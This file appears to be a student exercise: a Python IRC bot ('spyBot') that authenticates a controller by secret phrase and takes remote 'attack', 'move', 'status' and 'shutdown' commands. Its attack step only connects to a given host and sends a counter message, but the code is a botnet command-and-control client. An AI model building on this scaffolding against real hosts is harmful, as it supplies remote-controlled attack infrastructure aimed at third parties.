#!/usr/bin/env python
''' bot.py '''

import argparse
import sys
import socket
import random

from errors import ShutdownError
from errors import MoveError

# globals
DEBUG = True
BUFFER_SIZE = 2040

class Bot():
    def __init__(self, hostname, port, channel, secret_phrase):
        # init bot
        self.irc_host = hostname
        self.irc_port = port
        self.channel = '#' + channel
        self.secret_phrase = secret_phrase
        self.irc_socket = None
        self.nickname = 'spyBot'# + str(random.randint(1, 20))
        self.controller = None
        self.controller_nickname = None

        # move
        self.move_host = None
        self.move_port = None
        self.move_channel = None
        self.move_socket = None

        # attack variables
        self.target_socket = None
        self.target_host = None
        self.target_port = None
        self.attack_counter = 0

    def __send_to_channel(self, msg):
        '''
        send message to bot's channel
        format PRIVMSG <#channel> :<message>
        '''
        self.__send_message('PRIVMSG ' + self.channel + ' :' + msg + '\n')

    def __send_to_controller(self, msg):
        '''
        send message to specific user
        format PRIVMSG <nickname> :<message>
        '''
        self.__send_message('PRIVMSG ' + self.controller_nickname + ' :' + msg + '\n')

    def __send_to_target(self, msg):
        '''
        send any message to target
        '''
        self.target_socket.send((msg + '\n').encode('utf-8'))

    def __send_message(self, msg):
        '''
        send any message to irc server
        '''
        self.irc_socket.send(msg.encode('utf-8'))

    def __receive_message(self):
        '''
        receives message from IRC server and keeps
        connection alive by responding to 'PING #' with 'PONG #'
        and finally returns message
        '''
        received_msg = self.irc_socket.recv(BUFFER_SIZE).decode().strip()
        if received_msg.find('PING') != -1:
            self.__send_message('PONG ' + received_msg.split() [1] + '\r\n')

        return received_msg

    def __attempt_connection(self):
        '''
        '''
        return self.__connect(self.move_socket, self.move_host, int(self.move_port), self.move_channel, self.nickname, None)

    def __connect_to_irc(self):
        '''
        connect to IRC server
        test IRC server:
            162.246.156.17
            12399
        '''
        return self.__connect(self.irc_socket, self.irc_host, int(self.irc_port), self.channel, self.nickname, 5)

    def __connect(self, sock, host, port, channel, nickname, timeout):
        '''
        connect to IRC server using provided:
            sock
            host
            port
            channel
            nickname
        '''
        log('Connecting to: {}:{}, channel: {}, nickname: {}'.format(host, port, channel, nickname))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        while True:
            try:
                sock.connect((host, int(port)))
            except socket.timeout:
                log('IRC connection timedout!')
                return False
            except:
                log('Can\'t connect to: {}:{}, channel: {}'.format(host, int(port), channel))
                return False
            break
        self.__authenticate(sock, nickname, channel)
        sock.settimeout(None)
        return sock

    def __authenticate(self, sock, nickname, channel):
        sock.send(('USER ' + nickname + ' ' + nickname + ' ' + nickname + ' :\n').encode('utf-8'))
        sock.send(('NICK ' + nickname + '\n').encode('utf-8'))
        sock.send(('JOIN ' + channel + '\n').encode('utf-8'))

    def __connect_to_target(self):
        '''
        connect to target address using:
            target_host
            target_port

        return True if connection to target is successful, False otherwise
        '''
        log('Connecting to target: {}:{}'.format(self.target_host, int(self.target_port)))
        self.target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # self.target_socket.settimeout(5)
        while True:
            try:
                self.target_socket.connect((self.target_host, int(self.target_port)))
            except socket.timeout:
                log('Target connection timedout!')
                return False
            except Exception as e:
                log('Can\'t connect to: {}:{}'.format(self.target_host, int(self.target_port)))
                log(e)
                return False
            # sock.settimeout(None)
            return True

    def __handle_command(self, msg):
        _, cmd = msg.split(' :')
        cmd = cmd.split()

        if cmd[0] == 'status':
            try:
                self.__do_status()
            except ValueError as e:
                log('Status Command Error: {}'.format(e))

        elif cmd[0] == 'shutdown':
            try:
                self.__do_shutdown()
            except ValueError as e:
                self.__send_to_channel('{} failed to shutdown'.format(self.nickname))
                log('Shutdown Command Error: {}'.format(e))

        elif cmd[0] == 'attack':
            try:
                self.__do_attack(cmd)
            except ValueError as e:
                log('Attack Command Error: {}'.format(e))

        elif cmd[0] == 'move':
            if not (cmd[0] == 'move'):
                # if command is misspelled
                raise ValueError('Invalid command! {}'.format(cmd[0]))
            try:
                self.__do_move(cmd)
            except ValueError as e:
                log('Move Command Error: {}'.format(e))

        else:
            raise ValueError('Invalid command!')

    def __verify_controller(self, msg):
        '''
        authenticates the controller using secret_phrase
        format --> :Guest52!889f1007@87.98.219.117 PRIVMSG <#channel> :<msg>
        '''
        sender = msg.split(':')[1].split(' ')[0]
        list = msg.split(' :')
        secret = list[1]
        if self.secret_phrase == secret:
            self.controller = sender
            self.controller_nickname, _ = sender.split('!')
            log('Authenticated controller: ' + self.controller)
            return True
        else:
            log('Failed to authenticate controller: {}, using secret_phrase: {}'.format(sender, secret))
            return False

    def __update_controller_nickname(self, msg):
        '''
        update controller nickname
        format --> :Guest52!889f1007@87.98.219.117 NICK Guest522
        '''
        _, new_nickname = msg.split('NICK')
        new_nickname = new_nickname.strip()

        old_nickname = self.controller_nickname
        self.controller = self.controller.replace(old_nickname, new_nickname)
        self.controller_nickname = new_nickname
        log('Controller nickname updated from: {} to: {}'.format(old_nickname, new_nickname))

    def __validate_msg(self, msg):
        '''
        format: <sender garbage> :<msg>
        <msg>: secret_phrase command args
        '''
        if (self.controller != None) and (msg.startswith(':' + self.controller)):
            return True

        if not ('PRIVMSG' in msg) or not (self.channel in msg):
            return False

        return True

    def __listen(self):
        '''
        listens for commands from IRC server
        '''
        while True:
            try:
                msg = self.__receive_message()
            except socket.error as e:
                log('Socket error: {}\nReconnectiong...'.format(e))
                # reconnect
                self.__connect_to_irc()
            except KeyboardInterrupt:
                log('\nKeyboard interrupt, exiting..')
                return

            if not self.__validate_msg(msg):
                log('Warning: non-cotroller msg')
                log(msg)
                continue

            if self.controller == None:
                self.__verify_controller(msg)
                continue

            if not msg.startswith(':' + self.controller):
                continue

            if 'NICK' in msg:
                self.__update_controller_nickname(msg)
                continue

            log(msg)
            try:
                self.__handle_command(msg)
            except ShutdownError:
                self.irc_socket.close()
                log('Disconnected from server.')
                return
            except ValueError as e:
                log('Handle Command ValueError: {}'.format(e))
            except socket.error as e:
                log('Socket error: {}\nReconnectiong...'.format(e))
                # reconnect
                self.__connect_to_irc()
            except Exception as e:
                log('Handle Command Error: {}'.format(e))

    def __do_status(self):
        '''
        perform status command
        send this bot's nickname to authenticated controller
        '''
        self.__send_to_controller(self.nickname)
        return

    def __do_shutdown(self):
        '''
        perform shutdown command
        terminate bot program
        '''
        log('Shutdown command received, terminating connection.')
        self.__send_to_controller('{} shutting down'.format(self.nickname))
        raise ShutdownError()

    def __do_attack(self, cmd):
        '''
        perform attack command
        cmd format --> attack <host-name> <port>
        '''
        if len(cmd) != 3:
            raise ValueError('Invalid attack command.')
        try:
            target_host = cmd[1]
            target_port = cmd[2]
        except ValueError:
            raise ValueError('Failed to split attack.')

        # TODO validate ip
        if self.__validate_port(target_port):
            self.target_port = int(target_port)
        else:
            raise ValueError('Invalid port: {}'.format(self.target_port))
        self.target_host = target_host

        log('Attacking {}:{}'.format(self.target_host, self.target_port))

        connected_to_target = self.__connect_to_target()
        self.__attack(connected_to_target)
        return
    
    def __attack(self, connected_to_target):

        '''
        Every bot will connect to the given host/port and
        send a message containing two entries: a counter and
        the nick of the bot. On the next attack the counter
        should be increased by 1.
        '''
        if not connected_to_target:
            self.__send_to_controller('Attack on {}:{} fail!\n{} {}'.format(self.target_host, self.target_port, self.nickname, self.attack_counter))
            return
        
        try:
            self.__send_to_target('ATTACK --> {} {}'.format(self.nickname, self.attack_counter))
            # close target socket
            self.target_socket.close()
        except Exception as e:
            self.__send_to_controller('Attack on {}:{} fail!\n{} {}'.format(self.target_host, self.target_port, self.nickname, self.attack_counter))
            return
        self.attack_counter += 1
        self.__send_to_controller('Attack on {}:{} success!\n{} {}'.format(self.target_host, self.target_port, self.nickname, self.attack_counter))

    def __do_move(self, cmd):
        '''
        perform move command
        cmd format --> move <host-name> <port> <channel>
        '''
        if len(cmd) != 4:
            self.__send_to_controller('move failed. Invalid move command.')
            raise ValueError('Invalid move command.')
        try:
            host = cmd[1]
            port = cmd[2]
            channel = cmd[3]
        except ValueError:
            self.__send_to_controller('move failed. Failed to split move.')
            raise ValueError('Failed to split move.')
        log('Moving to {}:{}, channel {}'.format(host, int(port), channel))

        self.move_host = host
        if self.__validate_port(port):
            self.move_port = int(port)
        else:
            self.__send_to_controller('move failed. Invalid port.')
            raise ValueError('Invalid port: {}'.format(port))

        self.move_channel = '#' + channel
        self.move_socket = self.__attempt_connection()
        if not self.move_socket:
            log('Can\'t move to {}:{}, channel: {}\nReporting back to {}:{}, channel: {}'.format(self.move_host, self.move_port, self.move_channel, self.irc_host, self.irc_port, self.channel))
            self.__send_to_controller('failed to move to {}:{}, channel: {}\nReporting back to {}:{}, channel: {}'.format(self.move_host, self.move_port, self.move_channel, self.irc_host, self.irc_port, self.channel))
            return False
        self.__send_to_controller('move to {}:{}, channel: {} SUCESS!'.format(self.move_host, self.move_port, self.move_channel))
        self.irc_socket.close()
        self.irc_socket = self.move_socket
        self.__listen()

    def __validate_port(self, port):
        return int(port) in range(0, 65536)

    def start_bot(self):
        '''
        start bot
        source: https://stackoverflow.com/questions/2968408
        '''
        self.irc_socket = self.__connect_to_irc()
        if self.irc_socket != False:
            self.__listen()
        return


def parse_args():
    '''
    Handles parsing arguments
    Reference: https://docs.python.org/3/library/argparse.h
    '''
    usage = 'python3 bot.py <hostname> <port> <channel> <secret-phrase>'
    parser = argparse.ArgumentParser(usage=usage)

    # expected arguments
    parser.add_argument(
        'hostname',
        type=str,
        help='The <hostname> specifies the IRC server\'s hostname.'
    )
    parser.add_argument(
        'port',
        type=int,
        help='The <port> specifies the port for the IRC server\'s hostname'
    )
    parser.add_argument(
        'channel',
        type=str,
        help='The <channel> specifies which IRC channel the bot will join.'
    )
    parser.add_argument(
        'secret_phrase',
        type=str,
        help='The <secret-phrase> specifies some secret text that the IRC bot will listen for.'
    )

    args = parser.parse_args()
    if args.port not in range(0, 65536):
        log('Error: port must be 0-65535.')
        parser.exit('Usage: ' + usage)

    return args

def log(msg):
    ''' Log a debug message '''
    if DEBUG:
        print(msg, file=sys.stderr)

def main():
    args = parse_args()

    # start bot
    bot = Bot(args.hostname, int(args.port), args.channel, args.secret_phrase)
    bot.start_bot()


if __name__ == '__main__':
    main()
